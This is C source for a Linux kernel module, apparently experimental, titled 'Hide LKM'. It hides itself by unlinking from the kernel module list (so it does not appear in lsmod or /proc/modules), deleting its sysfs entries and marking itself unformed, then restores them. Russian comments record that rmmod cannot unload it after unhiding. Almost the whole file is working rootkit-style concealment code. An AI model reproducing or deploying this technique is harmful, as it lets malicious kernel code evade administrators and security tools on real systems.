#include <linux/init.h>
#include <linux/kernel.h>
#include <linux/module.h>

static int lkm_modinfo_attrs_safe(struct module *mod);
//static void lkm_modinfo_attrs_clr(struct module *mod);
static int lkm_modinfo_attrs_add(struct module *mod);
static int lkm_hide_proc(void);
static int lkm_show_proc(void);
static int lkm_hide_sys(void);	
static int lkm_show_sys(void);
static int lkm_sys_hide(void);
static int lkm_sys_unhide(void);
static int lkm_hide(void);
static int lkm_show(void);
static int lkm_tidy(void);

struct module_attribute *bkp_modinfo_attrs = NULL;
struct list_head *lkm_prev = NULL;
bool lkm_hidden_proc = false;
bool lkm_hidden_sys = false;

struct param_attribute {
    struct module_attribute mattr;
    const struct kernel_param *param;
};

struct module_param_attrs {
    unsigned int num;
    struct attribute_group grp;
    struct param_attribute attrs[0];
};

struct module_sect_attr {
    struct module_attribute mattr;
    char *name;
    unsigned long address;
};

struct module_sect_attrs {
	struct attribute_group grp;
	unsigned int nsections;
	struct module_sect_attr attrs[0];
};
////////////// UNUSED ///////////////////////////////////////
typedef struct mod_kobj {
	struct kobject *parent;
    	struct module_sect_attrs *sect_attrs;
	struct module_attribute  *bkp_modinfo_attrs;
	char name[30];
}mod_kobj_t;
struct mod_kobj lkm_sys_obj;
struct kobject kobj_lkm;
struct kobject *kobj_new;
struct kobject *kobj_parent;
const char *kobj_name;
/////////////////////////////////////////////////////////////

static int lkm_hide_proc(void) {

	if(lkm_hidden_proc) return lkm_hidden_proc;
	//printk(KERN_INFO "IN HIDE procfs\n");
	lkm_prev = THIS_MODULE->list.prev;
	list_del(&THIS_MODULE->list);

	//These are non-NULL pointers that will result in page faults
        //under normal circumstances, used to verify that nobody uses
        //non-initialized list entries.
	THIS_MODULE->list.next = (struct list_head*)LIST_POISON2;
    	THIS_MODULE->list.prev = (struct list_head*)LIST_POISON1;

	lkm_hidden_proc = true;
	return 0;
}

static int lkm_show_proc(void) {

	if(!lkm_hidden_proc) return 1;
	if(!lkm_prev) return 2;
	//printk(KERN_INFO "IN SHOW procfs\n");
	list_add(&THIS_MODULE->list, lkm_prev);
	lkm_prev = NULL;
	lkm_hidden_proc = false;
	return 0;
}

static int lkm_hide_sys(void) {	//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!!

	if(lkm_hidden_sys) return lkm_hidden_sys;

	kobject_del(&THIS_MODULE->mkobj.kobj);
	//list_del(&THIS_MODULE->mkobj.kobj.entry);
	lkm_hidden_sys = true;
	return 0;
}

static int lkm_show_sys(void) {	//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!! kobject_get() не помогает :(

	if(!lkm_hidden_sys) return 1;

	int a = kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, THIS_MODULE->mkobj.kobj.name);
	if(!a) return 1;

	lkm_hidden_sys = false;
	return 0;
}

static int lkm_tidy(void) {

	kfree(THIS_MODULE->notes_attrs);
	THIS_MODULE->notes_attrs = NULL;

	kfree(THIS_MODULE->sect_attrs);
	THIS_MODULE->sect_attrs = NULL;
	THIS_MODULE->modinfo_attrs->attr.name = NULL;

	kfree(THIS_MODULE->mkobj.mp);
	THIS_MODULE->mkobj.mp = NULL;

	kfree(THIS_MODULE->mkobj.drivers_dir);
	THIS_MODULE->mkobj.drivers_dir = NULL;
	return 0;
}
static int lkm_modinfo_attrs_safe(struct module *mod) {

	int i = 0;
	int ret = 0;
	struct module_attribute *attr =  &mod->modinfo_attrs[0];

	while(attr && attr->attr.name) {

		attr = &mod->modinfo_attrs[i];
		i++;
	//	printk(KERN_INFO "ATTR(%s) test(%lx) show(%lx) free(%lx)\n", attr->attr.name, attr->test, attr->show, attr->free);
	}
	//printk(KERN_INFO "i==0x%x\n", i);
	ret = i-1;
	i = (i+1) * sizeof(struct module_attribute);
	lkm_sys_obj.bkp_modinfo_attrs = kzalloc(i, GFP_KERNEL);
	if(!lkm_sys_obj.bkp_modinfo_attrs) return -1;
	memcpy(lkm_sys_obj.bkp_modinfo_attrs, mod->modinfo_attrs, i);

	return ret;
}

static int lkm_modinfo_attrs_add(struct module *mod) {

	int i = 0;
	int ret = 0;
	struct module_attribute *attr = &lkm_sys_obj.bkp_modinfo_attrs[0];

	while(attr && attr->attr.name) {

		attr = &mod->modinfo_attrs[i];
		i++;
		//printk(KERN_INFO "RET ATTR(%s)\n", attr->attr.name);
		if(attr->attr.name) {
			ret = sysfs_create_file(&mod->mkobj.kobj, &attr->attr);
			if(ret) {
				printk(KERN_INFO "ERROR: modinfo_attrs_add||i=%x, name=%s\n", i-1, attr->attr.name);
				return ret;
			}
		}
	}
	mod->modinfo_attrs = lkm_sys_obj.bkp_modinfo_attrs;
	i--;
	//printk(KERN_INFO "add = %x\n", i);
	return i;
}

static int lkm_sys_unhide(void) {
	int a;
	struct kobject *kobj;

	if(!lkm_hidden_sys) return 1;

	THIS_MODULE->state = MODULE_STATE_LIVE;
	a = kobject_add(&(THIS_MODULE->mkobj.kobj), lkm_sys_obj.parent, "%s", THIS_MODULE->name);
	if(a) goto put_sys_unh;

	//Create "holders"
	kobj = kobject_create_and_add("holders", &(THIS_MODULE->mkobj.kobj));
	if(!kobj) goto put_sys_unh;

	THIS_MODULE->holders_dir = kobj;

	//Create "sections"
	a = sysfs_create_group(&(THIS_MODULE->mkobj.kobj), &lkm_sys_obj.sect_attrs->grp);
	if(a) goto put_sys_unh;

	a = lkm_modinfo_attrs_add(THIS_MODULE);	
	if(a<=0) {
		if(THIS_MODULE->mkobj.mp) {
			sysfs_remove_group(&(THIS_MODULE->mkobj.kobj), &THIS_MODULE->mkobj.mp->grp);
			if(THIS_MODULE->mkobj.mp) {
				kfree(THIS_MODULE->mkobj.mp->grp.attrs);
				kfree(THIS_MODULE->mkobj.mp);
				THIS_MODULE->mkobj.mp = NULL;
			}
		}
	}
  put_sys_unh:
	kobject_put(&(THIS_MODULE->mkobj.kobj));
	
	lkm_hidden_sys = false;
	return 0;
}

static int lkm_sys_hide(void) {

	if(lkm_hidden_sys) return lkm_hidden_sys;

	lkm_sys_obj.sect_attrs = THIS_MODULE->sect_attrs;
	lkm_sys_obj.parent = THIS_MODULE->mkobj.kobj.parent;
	kobject_del(THIS_MODULE->holders_dir->parent);
	THIS_MODULE->holders_dir->parent->state_in_sysfs = 1;
	THIS_MODULE->state = MODULE_STATE_UNFORMED;

	lkm_modinfo_attrs_safe(THIS_MODULE);

	lkm_hidden_sys = true;
	return 0;
}

static int lkm_hide(void) {
	lkm_hide_proc();
//	lkm_hide_sys();			//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!!
	lkm_sys_hide();
	return 0;
}

static int lkm_show(void) {
	lkm_show_proc();
//	lkm_show_sys(); 		//Если снова сделать модуль видимым, то rmmod его НЕ ВЫГРУЗИТ!!!
	lkm_sys_unhide();
	return 0;
}
//////////////////// TESTS /////////////////////////////////////////////////////
static int lkm_list_proc(void);
static int lkm_modinfo_attrs_add1(struct module *mod);
static void lkm_modinfo_attrs_clr1(struct module *mod);

/*
 * sysfs restoration helpers.
 * Mostly copycat from the kernel with
 * light modifications to handle only a subset
 * of sysfs files
 */
static ssize_t show_refcnt(struct module_attribute *mattr,
        struct module_kobject *mk, char *buffer){
    return sprintf(buffer, "%i\n", module_refcount(mk->mod));
}
static struct module_attribute modinfo_refcnt =
    __ATTR(refcnt, 0444, show_refcnt, NULL);

static struct module_attribute *modinfo_attrs[] = {
    &modinfo_refcnt,
    NULL,
};

static int lkm_list_proc(void) {
	struct module * mod;
        struct list_head * pos;

	list_for_each(pos, &THIS_MODULE->list) {
                mod = list_entry(pos, struct module, list);
		printk(KERN_INFO "---Module name(%s)\n", mod->name);
	}
	return 0;
}
static void lkm_modinfo_attrs_clr1(struct module *mod) {

	struct module_attribute *attr = &mod->modinfo_attrs[0];

	if(attr && attr->attr.name) {
		sysfs_remove_file(&mod->mkobj.kobj, &attr->attr);
		if(attr->free) attr->free(mod);
	}

	kfree(mod->modinfo_attrs);
	return;
}
static int lkm_modinfo_attrs_add1(struct module *mod) {
	struct module_attribute *attr;
	struct module_attribute *tmp_attr;
	int a = 0;

	mod->modinfo_attrs = kzalloc((sizeof(struct module_attribute)*(ARRAY_SIZE(modinfo_attrs) + 1)), GFP_KERNEL);
    	if (!mod->modinfo_attrs) return -1;

    	tmp_attr = mod->modinfo_attrs;
	attr = modinfo_attrs[0];

	if(!attr->test || attr->test(mod)) {
		memcpy(tmp_attr, attr, sizeof(*tmp_attr));
		sysfs_attr_init(&tmp_attr->attr);
		a = sysfs_create_file(&mod->mkobj.kobj, &tmp_attr->attr);	
		if(a) goto err_exit;
	}
	return 0;

   err_exit:
	lkm_modinfo_attrs_clr1(mod);
	return a;
}
///////////////////////////////////////////////////////////////////////////////
static int __init lkm_hide_init(void) {

	printk(KERN_INFO "++++++ LKM_HOOK, ale-alE-aLE-OP ++++++\n");
	//lkm_list_proc();
	lkm_hide();
	lkm_show();
	return 0;
}
	

static void __exit lkm_hide_exit(void) {

	printk(KERN_INFO "++++++ LKM_HOOK, HN-Hn-hn ++++++\n");
	return;
}

module_init(lkm_hide_init);
module_exit(lkm_hide_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("PARFIK");
MODULE_DESCRIPTION("Hide LKM...");
MODULE_VERSION("0.01");
